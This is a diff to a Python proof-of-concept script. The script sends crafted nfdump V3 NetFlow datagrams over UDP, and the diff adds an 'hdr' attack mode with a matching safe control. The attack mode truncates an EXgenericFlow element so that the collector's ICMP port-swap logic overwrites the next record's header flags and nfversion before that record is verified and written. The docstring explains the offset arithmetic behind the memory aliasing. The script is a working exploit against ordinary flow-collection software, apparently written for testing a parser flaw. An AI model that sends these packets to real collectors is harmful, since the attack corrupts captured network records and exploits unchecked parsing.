@@ -26,10 +26,10 @@ DUMMY_LEN = 8         # includes the 4-byte element header
 ALIAS_SRC_PORT = 0x1234
 
 
-def record(elem_len, payload, nfversion=3):
+def record(elem_len, payload, nfversion=3, exporter_id=0):
     """One V3 record with a single EXgenericFlow element."""
     return (REC_HDR.pack(V3_RECORD, REC_HDR.size + elem_len, 1,
-                         0, 0, 0, 0, nfversion)
+                         0, 0, exporter_id, 0, nfversion)
             + ELEM_HDR.pack(EX_GENERIC_FLOW, elem_len) + payload)
 
 
@@ -76,6 +76,39 @@ def alias_datagram(first):
                         1764000000, 1, 2) + body
 
 
+HDR_EXPORTER_ID = 0xAB03  # high byte lands in victim flags, low in nfversion
+
+
+def hdr_datagram(first):
+    """Aim the pinned ICMP swap at record 2's V3 header flags/nfversion.
+
+    Record 1 is 48 bytes: 12-byte header + truncated EXgenericFlow (20) +
+    16-byte dummy element. Its flow view sees srcPort at record1+56,
+    dstPort at record1+58 and proto at record1+60. Record 2 starts at
+    record1+48, so those offsets are its exporterID (8..9), flags/nfversion
+    (10..11) and element type (12). The element type low byte is 1 (ICMP),
+    so the pinned swap copies the chosen exporterID bytes into flags and
+    nfversion, then zeros exporterID -- before record 2 is verified,
+    copied and written to the capture.
+    """
+    victim_payload = generic_flow(5, 500)
+    victim = record(EX_SIZE, victim_payload, exporter_id=HDR_EXPORTER_ID)
+
+    if first == "attack":
+        elems = ((EX_GENERIC_FLOW, 20, b"\x11" * 16),
+                 (DUMMY_TYPE, 16, bytes(12)))
+    else:
+        elems = ((EX_GENERIC_FLOW, EX_SIZE, generic_flow(3, 180)),)
+
+    body = REC_HDR.pack(V3_RECORD, REC_HDR.size + sum(e[1] for e in elems),
+                        len(elems), 0, 0, 0, 0, 3)
+    for etype, elen, payload in elems:
+        body += ELEM_HDR.pack(etype, elen) + payload
+    body += victim
+    return NFD_HDR.pack(VERSION_NFDUMP, NFD_HDR.size + len(body),
+                        1764000000, 1, 2) + body
+
+
 def edge_datagram():
     """Fill a maximum IPv4 UDP payload (65507 B) with a 4-byte flow element last.
 
@@ -110,6 +143,8 @@ def edge_safe_datagram():
 def datagram(mode):
     if mode in ("alias", "alias-safe"):
         return alias_datagram("attack" if mode == "alias" else "safe")
+    if mode in ("hdr", "hdr-safe"):
+        return hdr_datagram("attack" if mode == "hdr" else "safe")
     if mode == "edge":
         return edge_datagram()
     if mode == "edge-safe":
@@ -142,7 +177,8 @@ def main():
     ap = argparse.ArgumentParser()
     ap.add_argument("port", type=int)
     ap.add_argument("mode", choices=("attack", "safe", "icmp", "single",
-                                     "alias", "alias-safe", "edge", "edge-safe"))
+                                     "alias", "alias-safe", "hdr", "hdr-safe",
+                                     "edge", "edge-safe"))
     a = ap.parse_args()
     pkt = datagram(a.mode)
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
